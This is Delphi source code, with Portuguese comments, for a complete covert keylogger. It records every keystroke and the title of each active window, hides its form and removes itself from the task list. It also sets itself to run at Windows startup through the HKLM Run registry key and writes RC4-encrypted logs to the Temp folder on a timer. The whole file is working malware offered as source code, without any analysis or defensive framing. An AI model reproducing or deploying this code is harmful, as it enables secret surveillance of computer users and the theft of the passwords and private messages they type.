unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Registry,    WinTypes, WinProcs, DCPcrypt2,
  DCPrc4, DCPmd5;



type
  TForm1 = class(TForm)
    Timer1: TTimer;
    Memo1: TMemo;
    Panel1: TPanel;
    Label1: TLabel;
    Label2: TLabel;
    lbMouseY: TLabel;
    lbMouseX: TLabel;
    Timer2: TTimer;
    Label3: TLabel;
    DCP_rc4: TDCP_rc4;
    DCP_md51: TDCP_md5;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    Lista : TStringList;
    sFileName, sLastText, CurrentActiveWindowTitle : string;
    function GetActiveWindow:string;
    function Codificar(const Texto:string):string;
  end;


Const TASKHEIGHT  = 0;
//Const TASKHEIGHT  = -35;

var
  Form1: TForm1;
    function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer; stdcall; external 'KERNEL32.DLL';

implementation

{$R *.dfm}



function TForm1.Codificar(const Texto:string):string;
begin
  DCP_RC4.InitStr('Grupo Abril', TDCP_md5);
  Result := DCP_RC4.EncryptString(Texto);
  DCP_RC4.Burn;
end;



procedure TForm1.Timer1Timer(Sender: TObject);

  procedure WriteLogLine(txt: String);
  begin
     //tecla especial
     IF ( txt <> sLastText ) then begin
       Memo1.Lines.add(txt);
       Memo1.Perform( EM_SCROLLCARET, 0, 0 );
     end;
     sLastText := txt;
  end;


  procedure WriteLogChar(txt: String);
  begin
     //tecla digitada
     Memo1.Lines.Text := Memo1.Lines.Text + txt;
     //if txt = ' ' then txt := '[SPACE]';
     //WriteLogLine(txt);
     sLastText := txt;
  end;


var
  keyloop, KeyResult : Integer;
  sTemp : String;
begin
  lbMouseX.Caption := InttoStr(  Mouse.CursorPos.X );
  lbMouseY.Caption := InttoStr(  Mouse.CursorPos.Y );

  //Mostra o nome da janela atual
  sTemp := GetActiveWindow;
  if CurrentActiveWindowTitle <> sTemp then begin
     WriteLogLine('[  '  + sTemp + '  ] ');
     CurrentActiveWindowTitle := sTemp;
  end;

  keyloop := 0;
  repeat
    KeyResult := GetAsyncKeyState(keyloop);
    if KeyResult = -32767 then begin
      case keyloop of
        8: WriteLogLine(' [BACKSPACE] ');
        9: WriteLogLine(' [TAB] ');
        12: WriteLogLine(' [ALT] ');
        13: WriteLogLine(' [ENTER] ');
        16: WriteLogLine(' [SHIFT] ');
        17: WriteLogLine(' [CONTROL] ');
        18: WriteLogLine(' [ALT] ');
        20: WriteLogLine(' [CAPS LOCK] ');
        21: WriteLogLine(' [PAGE UP] ');
        27: WriteLogLine(' [ESC] ');
        33: WriteLogLine(' [PAGE UP] ');
        34: WriteLogLine(' [PAGE DOWN] ');
        35: WriteLogLine(' [END] ');
        36: WriteLogLine(' [HOME] ');
        37: WriteLogLine(' [LEFT] ');
        38: WriteLogLine(' [UP] ');
        39: WriteLogLine(' [RIGHT] ');
        40: WriteLogLine(' [DOWN] ');
        45: WriteLogLine(' [INSERT] ');
        46: WriteLogLine(' [DEL] ');
        91: WriteLogLine(' [WIN LEFT] ');
        92: WriteLogLine(' [WIN RIGHT] ');
        93: WriteLogLine(' [MENU POP-UP] ');
        96: WriteLogChar('0');
        97: WriteLogChar('1');
        98: WriteLogChar('2');
        99: WriteLogChar('3');
        100: WriteLogChar('4');
        101: WriteLogChar('5');
        102: WriteLogChar('6');
        103: WriteLogChar('7');
        104: WriteLogChar('8');
        105: WriteLogChar('9');
        106: WriteLogLine(' [NUM *] ');
        107: WriteLogLine(' [NUM +] ');
        109: WriteLogLine(' [NUM -] ');
        110: WriteLogLine(' [NUM SEP. DECIMAL] ');
        111: WriteLogLine(' [NUM /] ');
        112: WriteLogLine(' [F1] ');
        113: WriteLogLine(' [F2] ');
        114: WriteLogLine(' [F3] ');
        115: WriteLogLine(' [F4] ');
        116: WriteLogLine(' [F5] ');
        117: WriteLogLine(' [F6] ');
        118: WriteLogLine(' [F7] ');
        119: WriteLogLine(' [F8] ');
        120: WriteLogLine(' [F9] ');
        121: WriteLogLine(' [F10] ');
        122: WriteLogLine(' [F11] ');
        123: WriteLogLine(' [F12] ');
        144: WriteLogLine(' [NUM LOCK] ');
        186: WriteLogChar('Ç');
        187: WriteLogChar('=');
        188: WriteLogChar(',');
        189: WriteLogChar('-');
        190: WriteLogChar('.');
        191: WriteLogChar(';');
        192: WriteLogChar('''');
        193: WriteLogChar('/');
        194: WriteLogChar('.');
        219: WriteLogChar('´');
        220: WriteLogChar(']');
        221: WriteLogChar('[');
        222: WriteLogChar('~');
        226: WriteLogChar('\');
    else
        if (keyloop >= 32) and (keyloop <= 63) then WriteLogChar(Chr(keyloop));
        if (KeyLoop >= 65) and (keyloop <= 90) then WriteLogChar(lowercase(Chr(keyloop)));
        //numpad keycodes
        if (keyloop >= 96) and (keyloop <= 110) then WriteLogChar(Chr(keyloop));
        end;
    end; //case;
    inc(keyloop);
    until keyloop = 255;
end;

function  TForm1.GetActiveWindow:string;
var
  PC: Array[0..$FFF] of Char;
  Wnd: hWnd;
begin
  {$IFDEF Win32}
  Wnd := GetForegroundWindow;
  {$ELSE}
  Wnd := GetActiveWindow;
  {$ENDIF}
  SendMessage(Wnd, wm_GetText, $FFF, LongInt(@PC));
  Result := StrPas(PC);
end;


procedure TForm1.FormCreate(Sender: TObject);
{
  function GetTempDirectory: String;
  var
    tempFolder: array[0..MAX_PATH] of Char;
  begin
    GetTempPath(MAX_PATH, @tempFolder);
    result := StrPas(tempFolder);
  end;
}

  function GetWindowsDir: TFileName;
  var
    WinDir: array [0..MAX_PATH-1] of char;
  begin
    SetString(Result, WinDir, GetWindowsDirectory(WinDir, MAX_PATH));
    if Result = '' then
      raise Exception.Create(SysErrorMessage(GetLastError));
  end;


  function GetTempDirectory: String;
  begin
    Result := GetWindowsDir+'\Temp\';
  end;

  Procedure WriteStart;
  begin
    with TRegistry.Create do
      try
        RootKey := HKEY_LOCAL_MACHINE;
        if OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', False) then begin
          WriteString('Aplicativo', Application.exeName);
          CloseKey;
        end;
      finally
        Free;
      end;
  end;
function ctrlaltdelete(abilita: boolean): boolean;
type
  Proc=procedure(PID,T:DWord); stdcall;
var
   fhLib: hInst;
   RegProc:Proc;
begin
Result:=false;
FhLib:=GetModuleHandle(PChar('kernel32.dll'));
If FhLib=0 then Exit;
@RegProc:=GetProcAddress(FhLib,PChar('RegisterServiceProcess'));
if @RegProc<>nil then
   begin
   if abilita then
      RegProc(GetCurrentProcessID, 0)
   else
      RegProc(GetCurrentProcessID, 1);
   Result:=true;
   end;
end;
var
  val : integer;
begin
 // Oculta Programa
 Randomize;
 Application.ShowMainForm := FALSE;
 ctrlaltdelete(False);
 SetWindowLong(Application.Handle, GWL_EXSTYLE,  GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW );



 //Grava na inicializacao do windows
 WriteStart;

 val :=  random(999999) + random(999) + 222222 ;

 //Gera nome de log valido
 sFileName := datetimetostr(now)+inttostr(val)+'.log';
 sFileName := StringReplace(sFileName, '/','',[rfReplaceAll]);
 sFileName := StringReplace(sFileName, '-','',[rfReplaceAll]);
 sFileName := StringReplace(sFileName, ':','',[rfReplaceAll]);
 sFileName := StringReplace(sFileName, ' ','',[rfReplaceAll]);
 sFileName:=Stringreplace(sFileName, '/','-',[rfReplaceAll,rfIgnoreCase]);
 sFileName:=GetTempDirectory+Stringreplace(sFileName, ':','_',[rfReplaceAll,rfIgnoreCase]);


 //Cria Lista
 Lista := TStringList.Create;

end;




procedure TForm1.Timer2Timer(Sender: TObject);
begin
 Lista.text := Codificar(Memo1.Lines.Text);
 Lista.SaveToFile(sFileName);
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 Lista.text := Codificar(Memo1.Lines.Text);
 Lista.SaveToFile(sFileName);
 Lista.Destroy;
end;


end.
